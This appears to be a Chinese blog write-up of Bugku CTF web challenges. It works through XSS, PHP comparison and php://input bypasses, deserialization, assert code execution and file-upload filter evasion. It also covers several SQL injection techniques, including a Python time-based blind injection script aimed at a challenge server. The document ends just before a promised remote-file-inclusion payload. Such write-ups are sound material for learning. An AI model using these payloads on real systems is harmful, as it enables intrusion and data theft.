<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>这个题目是最简单的xss，所谓xss其实和sql注入差不多，这是xss用的是JavaScript语言，payload<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=src="null" <span class="attribute">onerror</span>=<span class="string">"alert(_key_)"</span>\u003e</span><br></pre></td></tr></table></figure></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>看到提示有1p.html，但是查看会跳转，用view-source查看即可，然后恢复代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])	<span class="comment">//$_GET['id']为空时执行该语句</span></span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现有个txt文件，不管别的，先看一下再说，结果直接出了flag，这应该是题目的漏洞。下面说正解<br>查看代码，$a的绕过的话 <code>a=php://input</code>，然后post<code>bugku is a nice plateform!</code>，<strong><font face="futura">$id==0</font></strong>的绕过话可以用    <code>id=%00</code>绕过， <code>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4</code>的绕过可以用<strong><font face="futura">b=%00123456</font></strong></p>
<blockquote>
<p>参看PHP手册可以知道<strong><font face="futura">php://input</font></strong>是个可以访问请求的原始数据的只读流，一般用来获取POST请求。<br>对于<font face="futura">id</font>的处理有代码可知，如果提交id=0，那么前面 <font face="futura">$_GET[‘id’]</font>会被判断为空，无法从而使代码exit。所以可以用<code>id=00</code>或者<code>id=%00</code>绕过(字符串0在PHP中会被当做空值)<br>函数<code>eregi()</code>现已被弃用，存在%00截断漏洞，读到<code>%00</code>的时候，判断就截止了。</p>
</blockquote>
<h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>访问元素发现源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>text的绕过可以使用php的input协议流，file的话用PHP的filter过滤器即可<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?txt=php://<span class="built_in">input</span>&amp;<span class="keyword">file</span>=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure></p>
<p>读取到一段base64代码，解码得到PHP代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>发现这是一个flag类，有个string方法，序列化即可使之执行。payload<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?txt=php:<span class="regexp">//i</span>nput&amp;file=hint.php&amp;password=O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>查看源代码可知已经构造了assert语句，这个对于我来说是一个新知识点。assert和eval类似，可以进行命令执行，只是eval参数为字符串，而assert参数则为函数或表达式。构造命令来执行<br><code>?s=var_dump(glob(‘*‘))</code></p>
<blockquote>
<p>函数<font face="futura">glob(pattern，flag)</font>可以匹配所有符合条件的文件</p>
</blockquote>
<p>读取文件<br><code>?s=var_dump(file(‘./flag.txt’))</code></p>
<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>这个正则表达式后面我得好好学一下了，有点菜。靠着百度大概搞懂了，介绍一些</p>
<blockquote>
<p><strong><font face="futura">[[:punct:]]</font></strong>为匹配任意字符，非字母和数字，<strong><font face="futura">.*</font></strong>为匹配任意字符，<strong><font face="futura">{m,n}</font></strong>为匹配字符m-n次，按照要求构造payload</p>
</blockquote>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=key.keyaaaaakey:<span class="regexp">/a/</span>keya%</span><br></pre></td></tr></table></figure>
<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>查看页面可知，是一段单身狗的诉说，查看元素发现竟然藏了一条链接，点击发现代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $v1 = $_GET[<span class="string">'v1'</span>];</span></span><br><span class="line"><span class="php">    $v2 = $_GET[<span class="string">'v2'</span>];</span></span><br><span class="line"><span class="php">    $v3 = $_GET[<span class="string">'v3'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>很简单的绕过<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">v1</span><span class="number">=240610708</span>&amp;<span class="built_in">v2</span><span class="symbol">=QNKCDZO</span>&amp;<span class="built_in">v3</span>[]<span class="number">=1</span></span><br></pre></td></tr></table></figure></p>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>看提示可知本题是SQL约束攻击，具体原理查看<a href="http://blog.csdn.net/qq_32400847/article/details/54137747" target="_blank" rel="noopener">传送门</a>，创建一个用户</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">用户名</th>
<th style="text-align:center">admin                                                1</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">密码</td>
<td style="text-align:center">Aa123456</td>
</tr>
</tbody>
</table>
</div>
<p>注册成功后用<code>admin</code>为用户名， <code>Aa123456</code>登录即可</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SKCTF&#123;<span class="number">4</span>D<span class="name">m1</span><span class="symbol">n_HaV3</span>_GreAt_p<span class="number">0</span>w<span class="number">3</span>R&#125;</span><br></pre></td></tr></table></figure>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示<font face="futura">are you from google?</font>，我以为是说浏览器，但实际上是说<strong><font face="futura">HTTP_REFERER</font></strong>，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。然后就是抓包发送即可，构造的referrer：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.google.com</span></span><br></pre></td></tr></table></figure></p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a><font face="futura">md5 collision</font></h2><p>这题是简单的md5哈希的比较<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=240610708</span><br></pre></td></tr></table></figure></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>这题很简单，直接上payload<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=margin&amp;uname<span class="string">[]</span>=<span class="number">1</span></span><br><span class="line">passwd<span class="string">[]</span>=<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<p>注意第二行为post数据。</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>代码审计与绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>要绕过的核心语句是<code>$ac===$f</code>，可以令 <code>ac=flag</code>，<code>fn</code>处使用之前说过的PHP的input协议，本题payload<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ac=flag<span class="meta">&amp;fn=php:<span class="comment">//input</span></span></span><br></pre></td></tr></table></figure></p>
<p>再post数据<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span></span><br></pre></td></tr></table></figure></p>
<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>看了一点提示，有点不好。这题一看页面没什么东西，随便尝试旁站robots.txt(就是这一步我没有做，唉，经验不足啊),扫描发现有个<code>resusl.php</code>页面，直接是<code>x=admin</code>即可(考验脑洞的时刻)</p>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>对于getshell的题目做的不是很多，真的是有点迷。抓包更改后缀为 <code>php2,php4.php5</code>，测试发现php5可用，然后再把文件类型改一下</p>
<blockquote>
<p>content-type: image/jpg</p>
</blockquote>
<p>还得改个东西</p>
<blockquote>
<p>Content-Type: Multipart/form-data; boundary=—————————————-265001916915724 </p>
</blockquote>
<p>把第一个<strong><font face="futura">m</font></strong>大写，有关介绍看个<a href="http://blog.csdn.net/five3/article/details/7181521" target="_blank" rel="noopener">链接</a>,这种绕过有点冷门，再放个<a href="https://www.tuicool.com/articles/vmuYz23?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com" target="_blank" rel="noopener">链接2</a></p>
<hr>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>这个题又让我学到了新知识，还顺便加强了一波脚本编写，本题考察的是 <strong><font face="futura">insert into注入</font></strong>，为什么存在注入呢</p>
<p>查看源代码，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br></pre></td></tr></table></figure></p>
<p>这句话一出， 说明<code>，</code>就被过滤了，所以这题是一道不能使用逗号的注入，而且报错什么的都不行，所以只能延时盲注。由于本题逗号被过滤了，所以if函数不能用了，在此<strong>解锁一个新姿势</strong><br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params">(<span class="keyword">select</span> user(</span>)) <span class="keyword">from</span> 1 <span class="keyword">for</span> 1)</span>;  <span class="meta">#第一种方法</span></span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params">(<span class="keyword">select</span> user(</span>)) <span class="keyword">from</span> -1)</span>;  <span class="meta">#第二种方法</span></span><br></pre></td></tr></table></figure></p>
<p>如此就可以不用逗号截取字符串</p>
<p>对于判断条件，可以使用<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (条件) <span class="keyword">then</span> 代码<span class="number">1</span> <span class="keyword">else</span> 代码 <span class="number">2</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
<p>这个前面数据库有介绍。<br>所以对于本题有两种payload：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into xs values(<span class="number">12</span>'+(<span class="name">select</span> case when binary substr((<span class="name">select</span> flag from flag) from <span class="number">1</span> for <span class="number">1</span>)='e' then sleep(<span class="number">5</span>) else sleep(<span class="number">0</span>) end) and 'a'='a')</span><br><span class="line">insert into xs values(<span class="number">12</span>'+(<span class="name">select</span> case when binary substr((<span class="name">select</span> flag from flag) from <span class="number">-1</span>)='e' then sleep(<span class="number">5</span>) else sleep(<span class="number">0</span>) end) and 'a'='a')</span><br></pre></td></tr></table></figure></p>
<p>再介绍一个<strong>绕过逗号</strong>的姿势：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,ip from client_ip where <span class="number">1</span>&gt;<span class="number">2</span>  <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span>  ( (<span class="title">select</span> <span class="title">user</span>())<span class="title">a</span> <span class="title">JOIN</span>  (<span class="title">select</span> <span class="title">version</span>())<span class="title">b</span> );</span>  --这个用于<span class="class"><span class="keyword">union</span> 查询的注入</span></span><br></pre></td></tr></table></figure>
<p>接下来就是写脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://120.24.86.145:8002/web15/"</span></span><br><span class="line">data = <span class="string">"12'+(select case when binary substr((select flag from flag) from &#123;&#125; for 1)='&#123;&#125;' then sleep(5) else 1 end) and 'a'='a"</span> </span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">start = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			headers = &#123;<span class="string">"x-forwarded-for"</span>:data.format(str(start),item)&#125;</span><br><span class="line">			res = requests.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">			flag += item</span><br><span class="line">			start += <span class="number">1</span></span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h2><p>尝试输入 <code>“</code>，发现有报错，可以报错注入。而且题目什么都没有过滤。</p>
<p>ed6b28e684817d9efcaf802979e57ae<br>ed6b28e684817d9efcaf802979e57aea<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">admin_name</span>=admin&amp;admin_passwd=afd" <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">admin_name</span>=admin&amp;admin_passwd=afd" <span class="keyword">and</span> updatexml(1,concat(0x7e,(select flag1 <span class="keyword">from</span> flag1),0x7e),1)%23</span><br></pre></td></tr></table></figure>
<p>用这种方法的出来的flag不对，因为该错误返回的值长度不足，可以再用下列子句截出<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">admin_name</span>=admin&amp;admin_passwd=afd" <span class="keyword">and</span> updatexml(1,concat(0x7e,substr((select flag1 <span class="keyword">from</span> flag1),3,30),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>也可以联合注入<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">admin_name</span>=admin&amp;admin_passwd=af" union select flag1,2 <span class="keyword">from</span> flag1%23</span><br></pre></td></tr></table></figure></p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>这个题学到了新东西，题目很不错。这个题目过滤了许多关键字<br>刚开始输入 <code>?id=1’</code>页面返回错误(但不是报错信息)，添加 <code>?id=1’%23</code>则没有报错，继续尝试 <code>?id=1’ and 1=1%23</code>则又开始报错了，猜测可能是存在过滤，但不知道过滤的是什么。找到一个<strong><font face="futura">异或注入</font></strong>的方法</p>
<hr>
<p>在<strong><font face="futura">id</font></strong>后面输入 <code>1’^(0)^’</code>，此时页面正常返回，如果换一下 <code>‘^(1)^’</code>，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。比如 <code>1’^(length(‘select’)!=6)^’</code>如果被过滤则返回错误，没有被过滤就返回正确。<br>如此可以测得多个变量被过滤</p>
<blockquote>
<font face="futura">select,union,or,and</font>

</blockquote>
<p>但是<strong><font face="futura">from,where，order</font></strong>等变量没有被过滤。在尝试一下 <code>1’^(length(‘selselectect’)!=6)^’</code>页面返回正确，说明可以通过这种方法绕过。那接下里就开始常规操作。</p>
<hr>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' oorrder by <span class="number">3</span>%<span class="number">23</span>   # 爆字段数</span><br><span class="line">?id=<span class="number">-1</span>' ununionion seleselectct <span class="number">1</span>,database() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>注意<em>information</em>的绕过。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1' ununionion seleselectct 1,group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.tables where <span class="attribute">table_schema</span>=database()%23</span><br></pre></td></tr></table></figure></p>
<p>最后得到下一个页面的地址<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' ununionion seleselectct <span class="number">1</span>,group_concat(address) from flag1%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>到了新页面之后，发现有报错，也会显示你的SQL语句，很简单就能看出很多都被过滤了，不过直接用报错就行了<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select flag2 from flag2),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>看别人的payload使用了<strong><font face="futura">locate()</font></strong>函数</p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="strcmp比较字符串-1"><a href="#strcmp比较字符串-1" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p>提交数组即可绕过 <code>?a[]=1</code></p>
<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p>也是提交数组 <code>?password[]=123</code> ,因为题目中的函数都是只能处理字符串，如果传入的是数组则会报错返回 <code>NULL</code>达到绕过的效果。</p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>看代码可知，$c获取的是输入流里面的值，因为$b是字符串，所以获取的是控制，故只需要相应的输入空值即可。</p>
<h2 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h2><p>没做出来，记录一下思路</p>
<p>题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">isset</span>($_GET[<span class="string">"a"</span>])?$_GET[<span class="string">"a"</span>]:<span class="string">''</span>;</span><br><span class="line">$b=<span class="keyword">isset</span>($_GET[<span class="string">"b"</span>])?$_GET[<span class="string">"b"</span>]:<span class="string">''</span>;</span><br><span class="line">$c=<span class="keyword">isset</span>($_GET[<span class="string">"c"</span>])?$_GET[<span class="string">"c"</span>]:<span class="string">''</span>;</span><br><span class="line">$d=<span class="keyword">isset</span>($_GET[<span class="string">"d"</span>])?$_GET[<span class="string">"d"</span>]:<span class="string">''</span>;</span><br><span class="line">$e=<span class="keyword">isset</span>($_GET[<span class="string">'e'</span>])?$_GET[<span class="string">'e'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"This not allow pseudo protocol!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"This also not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((file_get_contents($a,<span class="string">'r'</span>)===$b)&amp;&amp;(file_get_contents($e,<span class="string">'r'</span>)===<span class="string">"I'm Administrator!"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$c))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/base64/'</span>, $d))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No! you can't use it!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $d = unserialize($d);</span><br><span class="line">        <span class="keyword">echo</span> $d;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先变量a中不能出现php://等字段，显示我们不能使用PHP伪协议，但是这里可以远程文件包含，我们可以在自己的vps上写一个文件，然后a参数远程包含，再让b参数等于我们的文本内容就可了，对于e参数我们同样可以利用远程文件包含，在自己的vps上新建一个txt文件写入 <code>I&#39;m Administrator!</code> 即可，payload如下</p>
